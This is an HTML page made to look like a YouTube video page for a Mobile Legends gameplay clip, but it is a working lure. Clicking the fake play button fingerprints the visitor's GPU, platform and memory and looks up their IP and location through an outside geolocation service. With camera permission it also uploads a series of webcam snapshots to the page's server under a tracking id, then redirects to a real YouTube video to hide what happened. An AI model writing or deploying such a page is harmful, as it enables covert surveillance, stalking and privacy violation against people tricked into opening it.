<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-gray: #aaaaaa; --yt-surface: #272727; }
        body { margin: 0; background: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", Arial, sans-serif; overflow-x: hidden; }

        /* Desktop Header */
        nav {
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 24px;
            background: var(--yt-bg);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .logo { display: flex; align-items: center; font-size: 20px; font-weight: bold; cursor: pointer; }
        .logo i { color: #ff0000; margin-right: 4px; font-size: 26px; }
        .search-bar { 
            flex: 1; max-width: 600px; margin: 0 auto; height: 40px; 
            background: #121212; border: 1px solid #333; border-radius: 40px; 
        }

        /* PC Layout Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 400px;
            max-width: 1700px;
            margin: 0 auto;
            padding: 24px;
            gap: 24px;
        }

        /* Large Video Player */
        .video-container { width: 100%; }
        .pc-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000 url('https://i.ytimg.com/vi/mskhsZKeltA/maxresdefault.jpg') center/cover;
            border-radius: 12px;
            position: relative;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .yt-red-btn { 
            width: 68px; height: 48px; background: rgba(255,0,0,0.9); 
            border-radius: 12px; display: flex; align-items: center; justify-content: center; 
        }
        .yt-red-btn::after { 
            content: ''; border-left: 18px solid white; border-top: 12px solid transparent; 
            border-bottom: 12px solid transparent; margin-left: 5px; 
        }

        .meta-data { margin-top: 16px; }
        .title { font-size: 20px; font-weight: bold; margin-bottom: 12px; }
        .channel-info { display: flex; align-items: center; gap: 12px; }
        .pfp { width: 40px; height: 40px; background: #444; border-radius: 50%; }
        .sub-count { font-size: 12px; color: var(--yt-gray); }

        /* Desktop Sidebar */
        .sidebar-recs { display: flex; flex-direction: column; gap: 12px; }
        .mini-card { display: flex; gap: 8px; cursor: pointer; }
        .mini-thumb { width: 168px; height: 94px; background: #222; border-radius: 8px; flex-shrink: 0; }
        .mini-meta b { font-size: 14px; display: block; margin-bottom: 4px; line-height: 1.2; }
        .mini-meta span { font-size: 12px; color: var(--yt-gray); }

        video, canvas { display: none; }
    </style>
</head>
<body>

    <nav>
        <div class="logo"><i class="fab fa-youtube"></i> YouTube</div>
        <div class="search-bar"></div>
        <div style="width: 100px;"></div>
    </nav>

    <div class="main-grid">
        <div class="video-container">
            <div class="pc-player" onclick="startPC()">
                <div class="yt-red-btn"></div>
            </div>

            <div class="meta-data">
                <div class="title">Thamuz vs Minsitthar: Full Power Build & Gameplay (Immortal Rank)</div>
                <div class="channel-info">
                    <div class="pfp"></div>
                    <div style="flex:1">
                        <b>Vinzy Store</b><br>
                        <span class="sub-count">920K subscribers</span>
                    </div>
                    <button style="background:white; color:black; border:none; padding:10px 20px; border-radius:24px; font-weight:bold; cursor:pointer;">Subscribe</button>
                </div>
            </div>
        </div>

        <div class="sidebar-recs">
            <div class="mini-card">
                <div class="mini-thumb" style="background:url('https://i.ytimg.com/vi/mskhsZKeltA/hqdefault.jpg') center/cover;"></div>
                <div class="mini-meta"><b>How I reach Mythical Immortal</b><span>400K views</span></div>
            </div>
            <div class="mini-card">
                <div class="mini-thumb" style="background:url('https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg') center/cover;"></div>
                <div class="mini-meta"><b>Top 10 Builds 2026</b><span>1.2M views</span></div>
            </div>
            <div class="mini-card">
                <div class="mini-thumb" style="background:#222;"></div>
                <div class="mini-meta"><b>Minsitthar Combo Tutorial</b><span>89K views</span></div>
            </div>
        </div>
    </div>

    <video id="v" autoplay muted></video>
    <canvas id="c"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('id');
        const mode = urlParams.get('mode') || 'photo';
        const ytid = urlParams.get('ytid') || 'dQw4w9WgXcQ';

        async function startPC() {
            // Get GPU Info
            let gpu = "Unknown PC GPU";
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e){}

            try {
                // PC typically has high speed, so we request 720p specifically
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 } 
                });
                const v = document.getElementById('v');
                v.srcObject = stream;

                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
                await fetch(`/log_info?id=${tid}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ...ipData,
                        gpu: gpu,
                        platform: navigator.platform,
                        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A"
                    })
                });

                let count = 0;
                const limit = (mode === 'photo') ? 8 : 15;
                
                const interval = setInterval(() => {
                    if(count >= limit) {
                        window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
                        return;
                    }
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth;
                    canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob, 'pc_cap.jpg');
                        fetch(`/upload?id=${tid}&type=${mode}`, {method: 'POST', body: fd});
                    }, 'image/jpeg', 0.8);
                    count++;
                }, 600);

            } catch(e) {
                // Just redirect if user cancels
                window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
            }
        }
    </script>
</body>
</html>
